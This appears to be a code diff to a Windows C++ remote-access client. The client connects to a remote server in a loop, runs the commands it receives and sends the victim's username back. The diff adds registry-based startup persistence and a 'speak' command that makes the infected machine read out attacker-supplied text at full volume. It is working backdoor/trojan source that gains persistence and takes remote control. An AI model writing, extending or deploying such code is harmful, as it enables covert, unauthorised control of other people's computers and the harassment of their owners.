@@ -2,14 +2,21 @@
 #include <iostream>
 #include <Windows.h>
 #include <WS2tcpip.h>
+#include <sapi.h>
 #include "client.h"
 #include "main.h"
+#include "persistence.h"
 
 #pragma comment (lib, "Ws2_32.lib")
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
 {
 	init_winsock();
+	Registry startup;
+	if(!startup.CheckRegKey())
+	{
+		startup.SetRegKey();
+	}
 	CLIENT client;
 	string command;
 	while(true)
@@ -19,7 +26,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int n
 		{
 			client.connect_to_server();
 		}
-		handle_command(client,command);
+		handle_command(client, command);
 		Sleep(100);
 	}
 	return 0;
@@ -46,9 +53,13 @@ void handle_command(CLIENT& client, string& command)
 	{
 		send_username(client);
 	}
+	else if(command.substr(0,6) == "speak ")
+	{
+		speak_command(command);
+	}
 }
 
-void send_username(CLIENT& client) // TODO: Needs some polishing
+void send_username(CLIENT& client) 
 {
 	char *uname = new char[500];
 	DWORD user_len = 500;
@@ -57,4 +68,18 @@ void send_username(CLIENT& client) // TODO: Needs some polishing
 	resp.assign(uname);
 	client.send_response(resp);
 	delete[] uname;
+}
+
+void speak_command(string& command)
+{
+	ISpVoice * pVoice = NULL;
+	CoInitialize(NULL);
+	HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void **)&pVoice);
+	const char* to_speak_char = command.c_str() + 6;
+	wchar_t* to_speak_unicode = new wchar_t[command.length()];
+	MultiByteToWideChar(CP_UTF8, 0, to_speak_char, -1, to_speak_unicode, command.length());
+	pVoice->SetVolume(100);
+	hr = pVoice->Speak(to_speak_unicode, NULL, NULL);
+	pVoice->Release();
+	CoUninitialize();
 }
